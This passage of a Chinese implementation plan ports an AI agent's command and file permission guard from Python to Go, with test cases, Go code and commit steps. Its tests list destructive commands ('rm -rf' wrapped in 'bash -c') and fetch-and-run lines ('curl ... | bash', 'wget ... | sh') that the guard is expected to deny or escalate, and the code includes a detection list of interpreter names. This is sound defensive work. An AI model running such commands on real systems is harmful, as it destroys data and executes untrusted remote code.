**若「纯空白前缀不脱壳」失败**：说明 `shLauncherReStart` 的 `^\s*` 让 `echo bash -c 'rm'` 也匹配了。实际不会——`^` 要求 launcher 在行首，`echo ` 在 launcher 前，故不匹配。若失败，检查是否误用了 `shLauncherReSep`（`echo ` 里没有 `[;&|()]`）。

- [ ] **Step 7: 覆盖率检查**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/agentcore/harness/security/toolguard/
```

Expected: ≥ 85%。若不足，补 `StripFdAliasTokens` 的多 token 与行尾场景。

- [ ] **Step 8: 提交**

```bash
gofmt -l internal/agentcore/harness/security/toolguard/
git add internal/agentcore/harness/security/toolguard/command_canonicalize.go \
        internal/agentcore/harness/security/toolguard/command_canonicalize_test.go
git commit -m "feat(toolguard): shell 命令 launcher 脱壳（对齐 command_canonicalize.py）

脱一层 cmd /c、pwsh|powershell -Command|-c、POSIX shell -c。残留的
launcher 会让锚定通配符规则（rm *）与 shell 正则前缀匹配不到内层命令，
这是 9.90b 前 A/B 段共同的既有安全缺口。

RE2 不支持 look-around，两处改造：
1. Python 的 (?:^|(?<=[;&|()]))\\s* 拆成两条正则（行首版 + 分隔符版），
   分隔符版保留 sep 捕获组以恢复空格，避免粘成 `&&rm`
2. fd 标记的 (?<!\\S)...(?!\\S) 改为全匹配正则 + 手工分词"
git show --stat HEAD
```

Expected: 2 个文件。

---

## Task 3b：A 段六项对齐（脱壳接线 + 整串复核 + interpreter_sink + 外层 override）

**Files:**
- Modify: `internal/agentcore/harness/security/tiered_policy.go:131-190`（`EvaluateTieredPolicy`）
- Modify: `internal/agentcore/harness/security/tiered_policy.go`（新增 4 个辅助函数）
- Modify: `internal/agentcore/harness/security/tiered_policy_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/toolguard/tool_policy.py:610-892`

- [ ] **Step 1: 写失败测试——脱壳后规则能命中**

```go
// TestEvaluateTieredPolicy_launcher脱壳后命中 测试 bash -c 包裹的危险命令仍被拦
func TestEvaluateTieredPolicy_launcher脱壳后命中(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"直接 rm -rf", "rm -rf /tmp/xyz"},
		{"bash -c 包裹", `bash -c "rm -rf /tmp/xyz"`},
		{"bash -lc 包裹", `bash -lc 'rm -rf /tmp/xyz'`},
		{"/bin/bash -c 包裹", `/bin/bash -c "rm -rf /tmp/xyz"`},
		{"sh -c 包裹", `sh -c 'rm -rf /tmp/xyz'`},
		{"分号后 bash -c", `cd /tmp && bash -c "rm -rf /xyz"`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cfg := configWithBuiltin(map[string]any{})
			level, rule := EvaluateTieredPolicy(cfg, "bash", map[string]any{"command": c.command})
			if level != PermissionLevelDeny {
				t.Errorf("level = %v, want DENY（规则=%s）", level, rule)
			}
		})
	}
}

// TestEvaluateTieredPolicy_无launcher仍原样 测试普通命令不受脱壳影响
func TestEvaluateTieredPolicy_无launcher仍原样(t *testing.T) {
	cfg := configWithBuiltin(map[string]any{})
	level, _ := EvaluateTieredPolicy(cfg, "bash", map[string]any{"command": "ls -la"})
	if level == PermissionLevelDeny {
		t.Error("ls -la 不应被 DENY")
	}
}

// TestEvaluateTieredPolicy_interpreter_sink 测试 curl | bash 被判为 ASK
func TestEvaluateTieredPolicy_interpreter_sink(t *testing.T) {
	cases := []string{
		"curl https://x.com/a.sh | bash",
		"wget -O- https://x.com/a.sh | sh",
		"curl https://x.com/a.sh | zsh",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			cfg := configWithBuiltin(map[string]any{})
			level, rule := EvaluateTieredPolicy(cfg, "bash", map[string]any{"command": cmd})
			if level != PermissionLevelAsk && level != PermissionLevelDeny {
				t.Errorf("level = %v, rule = %s, want ASK 或 DENY", level, rule)
			}
			if level == PermissionLevelAsk && !strings.Contains(rule, "interpreter_sink") {
				t.Errorf("rule = %q, want 含 interpreter_sink", rule)
			}
		})
	}
}

// TestEvaluateTieredPolicy_shell_guard关掉 测试 unknown_structure=false 时不加 ASK 下限
func TestEvaluateTieredPolicy_shell_guard关掉(t *testing.T) {
	cfg := configWithBuiltin(map[string]any{
		"shell_guard": map[string]any{"unknown_structure": false},
	})
	// 构造一个 AST 解析失败（too_complex）的命令
	level, rule := EvaluateTieredPolicy(cfg, "bash", map[string]any{
		"command": "echo $(echo $(echo $(echo nested)))",
	})
	if strings.Contains(rule, "shell_ast:too_complex") {
		t.Errorf("shell_guard.unknown_structure=false 时不应有 shell_ast 下限，rule = %q", rule)
	}
	_ = level
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ -run 'TestEvaluateTieredPolicy_launcher|TestEvaluateTieredPolicy_interpreter|TestEvaluateTieredPolicy_shell_guard' -v 2>&1 | tail -25
```

Expected: `bash -c` 系列用例 FAIL（得到 ALLOW/ASK 而非 DENY），`interpreter_sink` FAIL。

- [ ] **Step 3: 重写 `EvaluateTieredPolicy`（含脱壳、整串复核、interpreter_sink、外层 override）**

把 `tiered_policy.go` 的 `EvaluateTieredPolicy` 整体替换为：

```go
// EvaluateTieredPolicy 分层策略评估：工具级 + 参数规则 + 默认。
//
// 实现顺序（逐步对应 Python tool_policy.py:768-892）：
//  1. 取 tools/defaults/rules/approval_overrides；按 layer=builtin 切分规则
//  2. baseline 整工具 deny 短路
//  3. 读 shell_guard 两个开关（unknown_structure / interpreter_sink）
//  4. 命令脱壳：canonCmd / canonArgs（原始与脱壳两份并存）
//  5. shell AST 解析（用 canonCmd）+ shell_ast 下限
//  6. override 命中：先原始，空了再查脱壳
//  7. 分支 A（shell 且 AST 为 simple）：子命令逐个评 → 聚合 → 整串复核
//      → interpreter_sink 守卫 → 外层 override 兜底 → 应用 AST 下限
//  8. 分支 B（其他）：eval_args 选 canon 或原始 → 单次评 → 外层 override 兜底
//
// Python: evaluate_tiered_policy(permission_config, tool_name, tool_args)
func EvaluateTieredPolicy(permissionConfig map[string]any, toolName string, toolArgs map[string]any) (PermissionLevel, string) {
	mode := parsePermissionMode(permissionConfig)

	toolsCfg := mapAnyField(permissionConfig, "tools")
	defaultsCfg := mapAnyField(permissionConfig, "defaults")
	approvalOverrides := listAnyField(permissionConfig, "approval_overrides")
	builtinRules, userRules := splitByBuiltinLayer(listAnyField(permissionConfig, "rules"))

	// 2. baseline 整工具 deny 短路
	bl, blRule := baselineLevel(toolsCfg, toolName)
	if bl == PermissionLevelDeny {
		if blRule == "" {
			blRule = mr + ":tools.deny"
		}
		return PermissionLevelDeny, blRule
	}

	// 3. shell_guard 两个开关
	checkUnknown, checkSink := readShellGuard(permissionConfig)

	// 4. 命令脱壳（原始与脱壳两份并存）
	originalCmd := commandText(toolArgs)
	canonCmd := toolguard.CanonicalizeShellCommandForPermission(originalCmd)
	var canonArgs map[string]any
	argsDiffer := canonCmd != originalCmd
	if argsDiffer {
		canonArgs = withShellCommand(toolArgs, canonCmd)
	}

	// 5. shell AST 用脱壳后的命令
	var shellParse *ShellAstParseResult
	isShell := toolCategory(toolName) == "shell"
	if isShell {
		shellParse = ParseShellForPermission(canonCmd)
	}
	shellFloor, shellFloorRule := shellAstFloorFor(shellParse, checkUnknown)

	invCtx := &tieredInvocationContext{
		Mode:              mode,
		BuiltinRules:      builtinRules,
		Rules:             userRules,
		ApprovalOverrides: approvalOverrides,
		BaselineLevel:     bl,
		BaselineRule:      blRule,
		DefaultsCfg:       defaultsCfg,
	}

	// 6. override 命中：先原始，空了再查脱壳
	overrideHits := collectApprovalOverrideHits(approvalOverrides, toolName, toolArgs)
	if len(overrideHits) == 0 && argsDiffer {
		overrideHits = collectApprovalOverrideHits(approvalOverrides, toolName, canonArgs)
	}

	// 7. 分支 A：shell 且 AST 为 simple
	if isShell && shellParse != nil && shellParse.Kind == ShellAstKindSimple {
		var subcommandResults []subcommandResult
		for _, subcmd := range shellParse.Subcommands {
			if subcmd.Text == "" {
				continue
			}
			// 子命令用原始 tool_args 作基底（Python L852），不是 canonArgs
			subArgs := withShellCommand(toolArgs, subcmd.Text)
			result := evaluateSingleInvocation(toolName, subArgs, invCtx)
			subcommandResults = append(subcommandResults, result)
			if result.Permission == PermissionLevelDeny {
				break
			}
		}
		permission, matchedRule := aggregateSubcommandResults(subcommandResults)

		// 整串参数规则复核：原始与脱壳各评一次，取最严
		var fullCandidates []subcommandResult
		if origFull := evaluateParamRulesOnly(toolName, toolArgs, invCtx); origFull != nil {
			fullCandidates = append(fullCandidates, *origFull)
		}
		if argsDiffer {
			if canonFull := evaluateParamRulesOnly(toolName, canonArgs, invCtx); canonFull != nil {
				fullCandidates = append(fullCandidates, *canonFull)
			}
		}
		if len(fullCandidates) > 0 {
			fullLevel := fullCandidates[0].Permission
			fullRule := fullCandidates[0].MatchedRule
			for _, c := range fullCandidates[1:] {
				merged := Strictest(fullLevel, c.Permission)
				if merged != fullLevel || merged == c.Permission {
					if merged == c.Permission {
						fullRule = c.MatchedRule
					}
				}
				fullLevel = merged
			}
			permission = Strictest(permission, fullLevel)
			if permission == fullLevel {
				matchedRule = fullRule
			}
		}

		// interpreter_sink 守卫
		if checkSink && hasInterpreterSink(shellParse) {
			permission = Strictest(permission, PermissionLevelAsk)
			if permission == PermissionLevelAsk {
				sinkRule := mr + ":shell_guard:interpreter_sink"
				if matchedRule != "" {
					matchedRule = sinkRule + "|" + matchedRule
				} else {
					matchedRule = sinkRule
				}
			}
		}

		permission, matchedRule = applyShellAstFloorTo(permission, matchedRule, shellFloor, shellFloorRule)
		return allowOverridesUnlessDenied(permission, matchedRule, overrideHits)
	}

	// 8. 分支 B：非 shell-simple
	evalArgs := toolArgs
	if isShell && argsDiffer {
		evalArgs = canonArgs
	}
	result := evaluateSingleInvocation(toolName, evalArgs, invCtx)
	permission, matchedRule := applyShellAstFloorTo(result.Permission, result.MatchedRule, shellFloor, shellFloorRule)
	return allowOverridesUnlessDenied(permission, matchedRule, overrideHits)
}
```

- [ ] **Step 4: 实现五个辅助函数**

在同一文件追加：

```go
// readShellGuard 读取 shell_guard 的两个开关，非 dict 时都默认 true。
//
// Python: _read_shell_guard(permission_config)
func readShellGuard(permissionConfig map[string]any) (unknownStructure, interpreterSink bool) {
	raw, ok := permissionConfig["shell_guard"].(map[string]any)
	if !ok {
		return true, true
	}
	return asShellGuardFlag(raw["unknown_structure"], true),
		asShellGuardFlag(raw["interpreter_sink"], true)
}

// asShellGuardFlag 读一个布尔开关，非 bool 时用默认值。
//
// Python: _as_shell_guard_flag(value, default=True)
func asShellGuardFlag(v any, def bool) bool {
	if b, ok := v.(bool); ok {
		return b
	}
	return def
}

// shellAstFloorFor 计算 shell AST 权限下限；unknownStructure 为假时不设下限。
//
// Python: _shell_ast_floor(shell_parse, *, unknown_structure)
func shellAstFloorFor(shellParse *ShellAstParseResult, unknownStructure bool) (PermissionLevel, string) {
	if shellParse == nil || !unknownStructure {
		return PermissionLevelNone, ""
	}
	if shellParse.Kind == ShellAstKindTooComplex {
		reason := shellParse.Reason
		if reason == "" {
			reason = "unsupported_complex_structure"
		}
		return PermissionLevelAsk, mr + ":shell_ast:too_complex:" + reason
	}
	if shellParse.Kind == ShellAstKindParseUnavailable && shellParse.Flags.HasRiskyStructure() {
		reason := shellParse.Reason
		if reason == "" {
			reason = "conservative_fallback"
		}
		return PermissionLevelAsk, mr + ":shell_ast:parse_unavailable:" + reason
	}
	return PermissionLevelNone, ""
}

// evaluateParamRulesOnly 只评参数规则（内置 + 用户），不看 baseline/defaults。
// 返回 nil 表示无命中。
//
// Python: _evaluate_param_rules_only(tool_name, tool_args, ctx)
func evaluateParamRulesOnly(toolName string, toolArgs map[string]any, ctx *tieredInvocationContext) *subcommandResult {
	builtinHits := collectParamRuleHits(ctx.BuiltinRules, toolName, toolArgs, ctx.Mode, "builtin")
	if hasDenyHit(builtinHits) {
		level, rule := finalizeHits(builtinHits, "builtin")
		return &subcommandResult{Permission: level, MatchedRule: rule}
	}
	userHits := collectParamRuleHits(ctx.Rules, toolName, toolArgs, ctx.Mode, "rules")
	if hasDenyHit(userHits) {
		level, rule := finalizeHits(userHits, "rules")
		return &subcommandResult{Permission: level, MatchedRule: rule}
	}
	if len(builtinHits) > 0 {
		level, rule := finalizeHits(builtinHits, "builtin")
		return &subcommandResult{Permission: level, MatchedRule: rule}
	}
	if len(userHits) > 0 {
		level, rule := finalizeHits(userHits, "rules")
		return &subcommandResult{Permission: level, MatchedRule: rule}
	}
	return nil
}

// hasInterpreterSink 判定管道末段是否为解释器（curl x | bash 这类注入）。
//
// Python: _has_interpreter_sink(shell_parse)
func hasInterpreterSink(shellParse *ShellAstParseResult) bool {
	if shellParse == nil || len(shellParse.Subcommands) < 2 {
		return false
	}
	if !shellParse.Flags.HasPipeline {
		return false
	}
	for i, sc := range shellParse.Subcommands {
		if i == 0 {
			continue
		}
		if _, hit := interpreterSinkNames[baseNameLower(sc.Text)]; hit {
			return true
		}
	}
	return false
}

// allowOverridesUnlessDenied 整命令级的 override 兜底：可放宽 ASK，不可放宽 DENY。
// 无 override 命中时原样返回。
//
// Python: _allow_overrides_unless_denied(permission, matched_rule, override_hits)
func allowOverridesUnlessDenied(permission PermissionLevel, matchedRule string, overrideHits []string) (PermissionLevel, string) {
	if permission == PermissionLevelDeny || len(overrideHits) == 0 {
		return permission, matchedRule
	}
	sorted := dedupStrings(append([]string(nil), overrideHits...))
	sort.Strings(sorted)
	return PermissionLevelAllow, approvalOverridesPrefix + ":" + strings.Join(sorted, "+")
}

// baseNameLower 取命令的 basename 并小写（去路径、去 .exe）。
func baseNameLower(cmd string) string {
	text := strings.TrimSpace(cmd)
	if text == "" {
		return ""
	}
	// 取第一个空白前的部分作为命令名
	for i, r := range text {
		if r == ' ' || r == '\t' {
			text = text[:i]
			break
		}
	}
	text = strings.ReplaceAll(text, "\\", "/")
	if idx := strings.LastIndex(text, "/"); idx >= 0 {
		text = text[idx+1:]
	}
	text = strings.ToLower(text)
	text = strings.TrimSuffix(text, ".exe")
	return text
}
```

补充常量与重命名（`shellAstFloor` → `applyShellAstFloorTo` 等）：

```go
var interpreterSinkNames = map[string]struct{}{
	"bash": {}, "sh": {}, "zsh": {}, "dash": {}, "ash": {},
	"python": {}, "python3": {}, "perl": {}, "ruby": {}, "node": {},
}
```

> **注意**：`interpreterSinkNames` 的确切成员必须从 Python `_INTERPRETER_SINK_NAMES` 照抄：
> ```bash
> grep -n "_INTERPRETER_SINK_NAMES" -A5 /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/toolguard/tool_policy.py | head -10
> ```
> **执行本步骤时先跑这条命令**，按输出填写，不要用上面的猜测值。

- [ ] **Step 5: 重命名既有函数避免冲突**

现有 `shellAstFloor(shellParse)` 与新 `shellAstFloorFor(shellParse, bool)` 名字不冲突，但语义重复。**删除旧的 `shellAstFloor`**，所有调用点改用 `shellAstFloorFor(shellParse, true)`（保持原行为）。

同理 `applyShellAstFloor` 重命名为 `applyShellAstFloorTo`（避免与 Python 同名函数混淆），改调用点。

```bash
cd /home/opensource/uapclaw-gateway
grep -rn "shellAstFloor(\|applyShellAstFloor(" --include=*.go internal/agentcore/harness/security/
```

逐个改完后：

```bash
CGO_ENABLED=1 go build -tags test ./internal/agentcore/harness/security/ && echo BUILD_OK
```

Expected: `BUILD_OK`。

- [ ] **Step 6: 运行测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ -v 2>&1 | tail -40
```

Expected: 新用例全 PASS。既有用例若因「整串复核更严」而结果变化，逐个核对 Python 行为后改断言并加注释。

- [ ] **Step 7: 全量回归 + 覆盖率**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/agentcore/harness/security/ 2>&1 | tail -3
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep "^FAIL" | head
```

Expected: 覆盖率 ≥ 85%，无 FAIL。

- [ ] **Step 8: 提交**

```bash
gofmt -l internal/agentcore/harness/security/
git add internal/agentcore/harness/security/tiered_policy.go \
        internal/agentcore/harness/security/tiered_policy_test.go
git commit -m "feat(security): A 段六项对齐——脱壳接线、整串复核、interpreter_sink

对齐 tool_policy.py:768-892：
- 命令脱壳：canonCmd 用于 AST 解析，canonArgs 用于规则匹配，两者与原始
  命令并存（不是替换）
- override 命中两轮：先原始，空了再查脱壳
- shell simple 分支：子命令聚合后做整串参数规则复核（原始与脱壳各评一次，
  取最严），更严时 matched_rule 一并替换
- interpreter_sink 守卫：curl x | bash 这类管道注入解释器抬到 ASK
- shell_guard 配置读取：unknown_structure / interpreter_sink 两个宿主开关
  （此前完全没读，开关无效）
- 外层 _allow_overrides_unless_denied：聚合后的 ASK 可被 override 放宽，
  DENY 不可"
git show --stat HEAD
```

Expected: 2 个文件。

---

## Task 4：`security/fileguard/file_tool_specs.go`

**Files:**
- Create: `internal/agentcore/harness/security/fileguard/file_tool_specs.go`
- Create: `internal/agentcore/harness/security/fileguard/file_tool_specs_test.go`
- Create: `internal/agentcore/harness/security/fileguard/doc.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/file_tool_specs.py`（63 行）

- [ ] **Step 1: 写失败测试**

```go
package fileguard

import "testing"

// TestLookupFileToolSpecs_内置17条 测试内置工具都有 spec
func TestLookupFileToolSpecs_内置17条(t *testing.T) {
	cases := map[string]struct {
		wantCount int
		wantFirst FileToolSpec
	}{
		"read_file":        {2, FileToolSpec{ToolName: "read_file", ArgName: "file_path", Action: FileActionRead}},
		"write_file":       {2, FileToolSpec{ToolName: "write_file", ArgName: "file_path", Action: FileActionWrite}},
		"edit_file":        {1, FileToolSpec{ToolName: "edit_file", ArgName: "file_path", Action: FileActionWrite}},
		"read_text_file":   {1, FileToolSpec{ToolName: "read_text_file", ArgName: "file_path", Action: FileActionRead}},
		"write_text_file":  {1, FileToolSpec{ToolName: "write_text_file", ArgName: "file_path", Action: FileActionWrite}},
		"write":            {1, FileToolSpec{ToolName: "write", ArgName: "file_path", Action: FileActionWrite}},
		"read":             {1, FileToolSpec{ToolName: "read", ArgName: "file_path", Action: FileActionRead}},
		"search_replace":   {3, FileToolSpec{ToolName: "search_replace", ArgName: "file_path", Action: FileActionWrite}},
		"grep":             {2, FileToolSpec{ToolName: "grep", ArgName: "path", Action: FileActionRead}},
		"glob_file_search": {1, FileToolSpec{ToolName: "glob_file_search", ArgName: "glob_pattern", Action: FileActionRead}},
		"glob":             {1, FileToolSpec{ToolName: "glob", ArgName: "pattern", Action: FileActionRead}},
		"list_dir":         {1, FileToolSpec{ToolName: "list_dir", ArgName: "path", Action: FileActionRead}},
		"list_files":       {1, FileToolSpec{ToolName: "list_files", ArgName: "path", Action: FileActionRead}},
	}
	for tool, want := range cases {
		specs := LookupFileToolSpecs(tool)
		if len(specs) != want.wantCount {
			t.Errorf("LookupFileToolSpecs(%q) 数量 = %d, want %d", tool, len(specs), want.wantCount)
			continue
		}
		if specs[0] != want.wantFirst {
			t.Errorf("LookupFileToolSpecs(%q)[0] = %+v, want %+v", tool, specs[0], want.wantFirst)
		}
	}
}

// TestLookupFileToolSpecs_未知工具 测试未注册工具返回 nil
func TestLookupFileToolSpecs_未知工具(t *testing.T) {
	if specs := LookupFileToolSpecs("no_such_tool"); specs != nil {
		t.Errorf("LookupFileToolSpecs(no_such_tool) = %v, want nil", specs)
	}
}

// TestRegisterFileTool_同名参数替换 测试同 arg_name 重复注册时替换而非追加
func TestRegisterFileTool_同名参数替换(t *testing.T) {
	const tool = "test_tool_replace"
	RegisterFileTool(FileToolSpec{ToolName: tool, ArgName: "file_path", Action: FileActionRead})
	RegisterFileTool(FileToolSpec{ToolName: tool, ArgName: "file_path", Action: FileActionWrite})

	specs := LookupFileToolSpecs(tool)
	if len(specs) != 1 {
		t.Fatalf("数量 = %d, want 1（同 arg_name 应替换）", len(specs))
	}
	if specs[0].Action != FileActionWrite {
		t.Errorf("Action = %v, want write（后者胜出）", specs[0].Action)
	}
}

// TestRegisterFileTool_不同参数追加 测试不同 arg_name 追加
func TestRegisterFileTool_不同参数追加(t *testing.T) {
	const tool = "test_tool_append"
	RegisterFileTool(FileToolSpec{ToolName: tool, ArgName: "path", Action: FileActionRead})
	RegisterFileTool(FileToolSpec{ToolName: tool, ArgName: "file_path", Action: FileActionRead})

	if specs := LookupFileToolSpecs(tool); len(specs) != 2 {
		t.Errorf("数量 = %d, want 2", len(specs))
	}
}

// TestLookupFileToolSpecs_返回副本 测试修改返回值不影响注册表
func TestLookupFileToolSpecs_返回副本(t *testing.T) {
	specs := LookupFileToolSpecs("read_file")
	specs[0].ArgName = "hacked"
	again := LookupFileToolSpecs("read_file")
	if again[0].ArgName == "hacked" {
		t.Error("返回的是共享切片，修改影响了注册表")
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ 2>&1 | head
```

Expected: `undefined: LookupFileToolSpecs`。

- [ ] **Step 3: 实现 `file_tool_specs.go`**

```go
// Package fileguard 提供文件路径防护判定（Pipeline B）。
//
// 本包对齐 Python openjiuwen/harness/security/permission_engine/fileguard/
// 四个模块，共 1,650 行：
//
//   - file_tool_specs.py（63）：工具 → (参数名, 读写动作) 的注册表
//   - path_extract.py（524）：把工具参数翻译成 [(path, action, source)]
//   - file_guard.py（870）：配置编译与路径判定
//   - sensitive_paths.py（193）：包内敏感路径底线注入
//
// # 在判定管线中的位置
//
//	Pipeline A（toolguard）：工具级与参数级规则
//	Pipeline B（本包）：路径防护——workspace 边界、敏感路径、读写轴
//	Pipeline C（netguard）：fetch 工具的 URL 白黑名单
//	→ strictest(A, B, C)
//
// # 双模式
//
// legacy 模式兼容旧的 external_directory 配置形态（无读写轴，只有统一 level）；
// native 模式支持 file_guard.paths 的 prefix/glob 两种匹配与 read/write/exec
// 三轴独立配置。模式由配置形态自动判定（见 file_guard.go 的 hasNativeFileGuard）。
//
// 文件目录：
//
//	fileguard/
//	├── doc.go                  # 包文档
//	├── file_tool_specs.go      # 工具参数与动作注册表
//	├── path_extract.go         # 参数 → [(path, action, source)]
//	├── file_guard.go           # 配置编译 + 判定
//	└── sensitive_paths.go      # 包内敏感路径注入
//
// 对应 Python 代码：openjiuwen/harness/security/permission_engine/fileguard/
package fileguard

import "sync"

// ──────────────────────────── 结构体 ────────────────────────────

// FileToolSpec 一个面向文件的工具的参数与动作约定。
//
// Python: @dataclass(frozen=True) FileToolSpec
type FileToolSpec struct {
	// ToolName 工具名
	ToolName string
	// ArgName 承载路径的参数名
	ArgName string
	// Action 该参数涉及的访问动作
	Action FileAction
}

// ──────────────────────────── 枚举 ────────────────────────────

// FileAction 文件访问动作。
//
// Python: FileAction = Literal["read", "write", "exec"]
type FileAction string

const (
	// FileActionRead 读取
	FileActionRead FileAction = "read"
	// FileActionWrite 写入
	FileActionWrite FileAction = "write"
	// FileActionExec 执行
	FileActionExec FileAction = "exec"
)

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// fileToolRegistryMu 注册表读写锁。Python 侧是可变全局（9.90e 的
	// send_file_path_guard 会注册原生 schema），Go 需保护并发。
	fileToolRegistryMu sync.RWMutex
	// fileToolRegistry 工具名 → spec 列表
	fileToolRegistry = map[string][]FileToolSpec{}
	// bootstrapOnce 内置 spec 只注册一次
	bootstrapOnce sync.Once
)

// ──────────────────────────── 导出函数 ────────────────────────────

// RegisterFileTool 注册或扩展一个工具的参数约定。
// 同一 arg_name 重复注册时替换，不同 arg_name 追加。
//
// Python: register_file_tool(spec)
func RegisterFileTool(spec FileToolSpec) {
	bootstrapOnce.Do(bootstrapBuiltinSpecs)

	fileToolRegistryMu.Lock()
	defer fileToolRegistryMu.Unlock()

	existing := fileToolRegistry[spec.ToolName]
	filtered := make([]FileToolSpec, 0, len(existing)+1)
	for _, s := range existing {
		if s.ArgName != spec.ArgName {
			filtered = append(filtered, s)
		}
	}
	filtered = append(filtered, spec)
	fileToolRegistry[spec.ToolName] = filtered
}

// LookupFileToolSpecs 查询一个工具的参数约定，未注册返回 nil。
// 返回副本，调用方修改不影响注册表。
//
// Python: lookup_file_tool_specs(tool_name)
func LookupFileToolSpecs(toolName string) []FileToolSpec {
	bootstrapOnce.Do(bootstrapBuiltinSpecs)

	fileToolRegistryMu.RLock()
	defer fileToolRegistryMu.RUnlock()

	specs, ok := fileToolRegistry[toolName]
	if !ok || len(specs) == 0 {
		return nil
	}
	out := make([]FileToolSpec, len(specs))
	copy(out, specs)
	return out
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// bootstrapBuiltinSpecs 注册内置的 17 条工具参数约定。
//
// Python: _bootstrap_builtin_specs()
func bootstrapBuiltinSpecs() {
	fileToolRegistryMu.Lock()
	defer fileToolRegistryMu.Unlock()

	if len(fileToolRegistry) > 0 {
		return
	}
	builtins := []FileToolSpec{
		{ToolName: "read_file", ArgName: "file_path", Action: FileActionRead},
		{ToolName: "read_file", ArgName: "path", Action: FileActionRead},
		{ToolName: "write_file", ArgName: "file_path", Action: FileActionWrite},
		{ToolName: "write_file", ArgName: "path", Action: FileActionWrite},
		{ToolName: "edit_file", ArgName: "file_path", Action: FileActionWrite},
		{ToolName: "read_text_file", ArgName: "file_path", Action: FileActionRead},
		{ToolName: "write_text_file", ArgName: "file_path", Action: FileActionWrite},
		{ToolName: "write", ArgName: "file_path", Action: FileActionWrite},
		{ToolName: "read", ArgName: "file_path", Action: FileActionRead},
		{ToolName: "search_replace", ArgName: "file_path", Action: FileActionWrite},
		{ToolName: "search_replace", ArgName: "path", Action: FileActionWrite},
		{ToolName: "search_replace", ArgName: "target_file", Action: FileActionWrite},
		{ToolName: "grep", ArgName: "path", Action: FileActionRead},
		{ToolName: "grep", ArgName: "file_path", Action: FileActionRead},
		{ToolName: "glob_file_search", ArgName: "glob_pattern", Action: FileActionRead},
		{ToolName: "glob", ArgName: "pattern", Action: FileActionRead},
		{ToolName: "list_dir", ArgName: "path", Action: FileActionRead},
		{ToolName: "list_files", ArgName: "path", Action: FileActionRead},
	}
	for _, s := range builtins {
		list := fileToolRegistry[s.ToolName]
		filtered := make([]FileToolSpec, 0, len(list)+1)
		for _, old := range list {
			if old.ArgName != s.ArgName {
				filtered = append(filtered, old)
			}
		}
		fileToolRegistry[s.ToolName] = append(filtered, s)
	}
}
```

- [ ] **Step 4: 运行测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -v 2>&1 | tail -20
```

Expected: 全部 PASS。

> **注意测试顺序污染**：`TestRegisterFileTool_*` 会往全局注册表写数据，与其他测试共享。用不同的测试专用工具名（`test_tool_replace` / `test_tool_append`）隔离，已在上面的用例中如此。

- [ ] **Step 5: 写 `doc.go`（内容见 Step 3 的 package 注释），把 `file_tool_specs.go` 的 package 注释删掉**

`doc.go` 里放 package 注释 + `package fileguard`；`file_tool_specs.go` 只保留 `package fileguard`。

- [ ] **Step 6: 提交**

```bash
gofmt -l internal/agentcore/harness/security/fileguard/
git add internal/agentcore/harness/security/fileguard/doc.go \
        internal/agentcore/harness/security/fileguard/file_tool_specs.go \
        internal/agentcore/harness/security/fileguard/file_tool_specs_test.go
git commit -m "feat(fileguard): 工具参数与动作注册表（Pipeline B 底座）

对齐 file_tool_specs.py（63 行）。17 条内置 spec 描述「工具 → (参数名,
读写动作)」，供 path_extract 把参数翻译成路径访问。

注册表用 RWMutex 保护：Python 侧是可变全局，9.90e 的
send_file_path_guard 会注册原生 schema。同 arg_name 替换、不同追加。"
git show --stat HEAD
```

Expected: 3 个文件。

---

## Task 5：`security/fileguard/path_extract.go`

**Files:**
- Create: `internal/agentcore/harness/security/fileguard/path_extract.go`
- Create: `internal/agentcore/harness/security/fileguard/path_extract_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/path_extract.py`（524 行）

> **本任务是全批最长的文件（524 行，23 个函数）。建议按「抽取器 → shell 解析 → 统一入口」三段推进，每段一提交。**

- [ ] **Step 1: 通读 Python 源码，按函数分组**

```bash
sed -n '1,120p' /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/path_extract.py
sed -n '120,300p' /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/path_extract.py
sed -n '300,524p' /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/path_extract.py
```

分组（与 spec §3.3 一致）：

| 组 | 函数 | 行 |
|---|---|---|
| A 路径规整 | `_is_windows_abs_text` / `_resolve_extract_path` / `_looks_like_path` / `_resolve_path_str` | 79-108, 452-466 |
| B home 展开 | `_join_home_rest` / `_unglue_home_hidden` / `_expand_home_token` | 122-153 |
| C token 判定 | `_looks_like_redirect_target` / `_is_shell_flag_token` / `_nt_cmd_exe_switch_token` / `_strip_separator_residue` | 90-108, 154-192, 250-258 |
| D 引号与分段 | `_quoted_spans` / `_index_in_quoted_span` / `_ampersand_is_redirect` / `_split_unquoted_command_segments` / `_segments_for_extract` | 163-226, 266-281 |
| E 单段抽取 | `_path_aware_one_segment` / `extract_path_aware_command_accesses` | 282-365 |
| F shell 抽取 | `extract_shell_path_accesses` / `_collect_ps_path_tokens` / `_basename_lower` | 227-249, 387-451 |
| G 统一入口 | `_specs_for_tool` / `extract_accesses_native` | 467-524 |

- [ ] **Step 2: 写失败测试——统一入口的三个分支**

```go
package fileguard

import (
	"path/filepath"
	"testing"
)

// TestExtractAccessesNative_注册spec分支 测试按 spec 的 arg_name 抽路径
func TestExtractAccessesNative_注册spec分支(t *testing.T) {
	ws := t.TempDir()
	args := map[string]any{"file_path": filepath.Join(ws, "a.txt")}
